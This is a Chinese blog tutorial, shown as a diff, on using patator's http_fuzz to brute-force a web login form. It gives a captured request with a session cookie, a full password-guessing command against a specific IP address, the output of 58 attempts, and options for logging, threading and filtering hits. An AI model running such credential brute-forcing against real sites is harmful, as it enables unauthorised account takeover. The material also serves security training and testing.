@@ -1,0 +1,185 @@
+<p>参考： <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a>
+</p>
+<p>hydra 貌似不能只发POST请求。 每次都需要发送GET, 和POST 一起。 比较浪费啊，所以搜索的时候， 就搜到了patator.&#160;</p>
+<h3>安装略。&#160;</h3>
+<h3>使用</h3>
+<p>查看帮助： patator http_fuzz -h .&#160;&#160;会有好长一大堆。&#160;
+</p>
+<p>完整的使用帮助在这里：&#160;<a href="https://github.com/lanjelot/patator/blob/master/patator.py">https://github.com/lanjelot/patator/blob/master/patator.py</a>
+</p>
+<p>关键字： FILE, COMBO</p>
+<p>一旦发现参数中有 --username=FILE0 的时候，后面就需要跟着&#160; 0=username.txt&#160;&#160;</p>
+<p>这个就是fuzz .&#160;</p>
+<p>FILE:&#160; 表示一个文件</p>
+<p>COMBO: 表示一个combo文件, 例如 user=COMBO20 password=COMBO21 2=combo.txt&#160; &#160;</p>
+<p>combo.txt 每行内容如下：&#160; &#160; &#160; <br />lilei:123456<br />hanmeimei:888888</p>
+<p>NET: 表示 网段&#160; 例如 host=NET0 0=10.0.1.0/24,10.0.2.0/24</p>
+<p>RANGE&#160; 可以表示一段数字范围, 例如 rid=RANGE0 0=int:500-2000</p>
+<p>PROG&#160; 一段外部命令。 例如&#160; &#160;data=PROG0&#160; 0='seq 1 80'</p>
+<h3>设置header</h3>
+<p>创建文件 headers.txt ,&#160; 内容如下：</p>
+<pre>Host: 59.63.200.79:8003
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Origin: http://59.63.200.79:8003
+Connection: close
+Referer: http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/login.html
+Cookie: PHPSESSID=t6pmsv3j38ms49ntc2bj9r1ou3; BkGOp9578O_think_template=default; UM_distinctid=17862f2b3810-046e9538a9697a8-30634644-1fa400-17862f2b3820; CNZZDATA1257137=cnzz_eid%3D1501636784-1616565607-%26ntime%3D1616628718
+Upgrade-Insecure-Requests: 1
+
+
+</pre>
+<p>保存即可。&#160;</p>
+<p>调用的时候&#160;&#160;    header='headers.txt'    </p>
+<h3>基本使用</h3>
+<p>对于下面的原始请求内容(来自于burp suite)</p>
+<pre>POST /dami_999/dami_666/index.php?s=/member/dologin.html HTTP/1.1
+Host: 59.63.200.79:8003
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Origin: http://59.63.200.79:8003
+Connection: close
+Referer: http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/login.html
+Cookie: PHPSESSID=t6pmsv3j38ms49ntc2bj9r1ou3; BkGOp9578O_think_template=default; UM_distinctid=17862f2b3810-046e9538a9697a8-30634644-1fa400-17862f2b3820; CNZZDATA1257137=cnzz_eid%3D1501636784-1616565607-%26ntime%3D1616628718
+Upgrade-Insecure-Requests: 1
+
+username=admin&amp;userpwd=lueluelu9999e&amp;verify=11493&amp;lasturl=
+</pre>
+<p>我们可以这样：</p>
+<pre>http_fuzz url=http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html \
+    method=POST   \
+    body='username=admin&amp;userpwd=FILE0&amp;verify=11493&amp;lasturl='  \
+    header='@headers.txt'    
+    0=passwords.txt
+</pre>
+<p>headers.txt 见上面&#160; &#160;, 这里需要在参数中使用@, 表示这个是一个文件的意思。不加@的话不会生效。</p>
+<p>passwords.txt 就是明文密码的枚举，每行一个，例如：</p>
+<p>admin123<br />123456<br />888888<br />666666</p>
+
+<p>结果如下（可以看出是并发请求的过程） </p>
+<pre>20:51:30 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.1 at 2021-03-24 20:51 EDT
+20:51:30 patator    INFO -                                                                              
+20:51:30 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+20:51:30 patator    INFO - -----------------------------------------------------------------------------
+20:51:31 patator    INFO - 200  1879:1392      0.642 | systemadmin                        |     7 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.622 | test1                              |     8 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.105 | admin456                           |    17 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.706 | test12                             |     9 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.698 | test123                            |    10 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.878 | guest                              |     6 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.104 | xushaoyong                         |    27 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.208 | adminabc                           |    18 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.152 | test                               |    19 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.115 | 123456                             |    20 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.163 | yangfan                            |    37 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.154 | liukai                             |    28 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.118 | liuhua                             |    29 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.188 | likaipeng                          |    30 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.249 | admin123                           |    16 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.130 | linqianting                        |    47 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.175 | ligang                             |    38 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.138 | luochengcong                       |    39 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.119 | chenchongbing                      |    26 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.132 | yangwenbin                         |    49 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      1.390 | root                               |     3 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.083 | lijunfang                          |    36 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.158 | daiqiang                           |    57 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.141 | jiangxufu                          |    48 | HTTP/1.1 200 OK
+20:51:31 patator    INFO - 200  1879:1392      0.313 | zhangguobai                        |    40 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.120 | huangtao                           |    46 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.146 | lufei                              |    58 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.111 | dengcaiying                        |    50 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.150 | admin888888                        |    13 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      1.552 | test                               |     4 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      1.619 | system                             |     5 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.098 | wenkunyong                         |    56 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.118 | xiejiangling                       |    23 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.097 | admin12345                         |    14 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      1.810 | admin                              |     1 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.110 | zhangshun                          |    33 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.100 | liuzhiyu                           |    24 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.108 | zkaq                               |    15 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.113 | lichunlan                          |    43 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.147 | xiafeng                            |    34 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.130 | errorlog                           |    25 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.166 | admin888                           |    11 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.099 | liqifan                            |    53 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.142 | zongjingban                        |    35 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.125 | 12345                              |    21 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      2.121 | zkaq                               |     2 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.133 | yuanmingrun                        |    44 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.112 | lvpengdong                         |    45 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.182 | marketing                          |    54 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.168 | jiangxiangwei                      |    31 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.164 | admin123456                        |    12 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.120 | luozhijian                         |    55 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.087 | fangyundan                         |    41 | HTTP/1.1 200 OK
+20:51:32 patator    INFO - 200  1879:1392      0.096 | liuwei                             |    22 | HTTP/1.1 200 OK
+20:51:33 patator    INFO - 200  1879:1392      0.094 | service_yzx                        |    51 | HTTP/1.1 200 OK
+20:51:33 patator    INFO - 200  1879:1392      0.112 | yuanyi                             |    32 | HTTP/1.1 200 OK
+20:51:33 patator    INFO - 200  1879:1392      0.072 | wangzhe                            |    42 | HTTP/1.1 200 OK
+20:51:33 patator    INFO - 200  1879:1392      0.076 | prince.wang                        |    52 | HTTP/1.1 200 OK
+20:51:33 patator    INFO - Hits/Done/Skip/Fail/Size: 58/58/0/0/58, Avg: 18 r/s, Time: 0h 0m 3s
+</pre>
+<p>可以看出， 1879 是返回的内容长度（一样说明密码不正确）</p>
+<p>clen = 1392,&#160; content length, 估计是http传输 1879 字节时候的各种处理相关的东东。&#160;&#160;</p>
+<p>虽然都返回200， 但是不能说明什么，我们要找到 登录成功的尝试。&#160;</p>
+<p>所以需要打印 response, 以及 debug&#160;</p>
+<h3>--debug&#160; &#160;打印详细的内容&#160; &#160; 不过暂时可以忽略了，仅仅在于首次调试的时候（例如看看你的参数对不对）才有必要，否则没必要打印。&#160;</h3>
+<pre>└─$ patator http_fuzz url=http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html \
+    method=POST   \
+    body='username=admin&amp;userpwd=lueluelue&amp;verify=11493&amp;lasturl='  \
+    header=headers.txt \
+    0=passwords.txt --debug
+
+21:44:05 patator   DEBUG [MainProcess] arg: 'url=http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html'
+21:44:05 patator   DEBUG [MainProcess] k: url, v: http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html
+21:44:05 patator   DEBUG [MainProcess] arg: 'method=POST'
+21:44:05 patator   DEBUG [MainProcess] k: method, v: POST
+21:44:05 patator   DEBUG [MainProcess] arg: 'body=username=admin&amp;userpwd=lueluelue&amp;verify=11493&amp;lasturl='
+21:44:05 patator   DEBUG [MainProcess] k: body, v: username=admin&amp;userpwd=lueluelue&amp;verify=11493&amp;lasturl=
+21:44:05 patator   DEBUG [MainProcess] arg: 'header=headers.txt'
+21:44:05 patator   DEBUG [MainProcess] k: header, v: headers.txt
+21:44:05 patator   DEBUG [MainProcess] arg: '0=passwords.txt'
+21:44:05 patator   DEBUG [MainProcess] k: 0, v: passwords.txt
+21:44:05 patator   DEBUG [MainProcess] kargs: [('url', 'http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html'), ('method', 'POST'), ('body', 'username=admin&amp;userpwd=lueluelue&amp;verify=11493&amp;lasturl='), ('header', 'headers.txt')]
+21:44:05 patator   DEBUG [MainProcess] iter_vals: ['passwords.txt']
+21:44:05 patator   DEBUG [MainProcess] iter_groups: {}
+21:44:05 patator   DEBUG [MainProcess] iter_keys: {}
+21:44:05 patator   DEBUG [MainProcess] enc_keys: []
+21:44:05 patator   DEBUG [MainProcess] payload: {'url': 'http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html', 'method': 'POST', 'body': 'username=admin&amp;userpwd=lueluelue&amp;verify=11493&amp;lasturl=', 'header': 'headers.txt'}
+21:44:05 patator   DEBUG [MainProcess] actions: {}
+21:44:05 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.1 at 2021-03-24 21:44 EDT
+21:44:05 patator   DEBUG [Producer] payload sets: {}
+21:44:05 patator   DEBUG [Producer] zipit: [['']]
+21:44:05 patator   DEBUG [Producer] total_size: 1
+</pre>
+<h3>response与记录日志&#160; -l log_folder&#160;</h3>
+<p>由于response内容太多，次数太多，所以需要把它记录在文件中，慢慢翻看。</p>
+<p>这个参数 -l&#160; （小写的L) 会把 日志记录在对应的文件夹中（ 3个文件）</p>
+<pre>└─$ ls           
+1_200-1879:1392-0.159.txt    这里是表示： 1次尝试，200 code, 内容 1879， content长度1392， 0.159 秒结束
+RESULTS.csv               CSV内容
+RESULTS.xml               HTML内容
+RUNTIME.log                控制台输出内容。
+
+</pre>
+<h3>--rate-limit=1 每次休息1秒</h3>
+<h3>--threads=2 每次2个线程</h3>
+<h3>-x ignore （待测试）</h3>
+<p>可用的选项：</p>
+<p>code</p>
+<p>time</p>
+<p>size</p>
+<p> -x ignore:'code=200|size=1500-|fgrep=Welcome, unauthenticated user' </p>
+<p>mesg</p>
+<p>fgrep</p>
+<p>egrep&#160;</p>
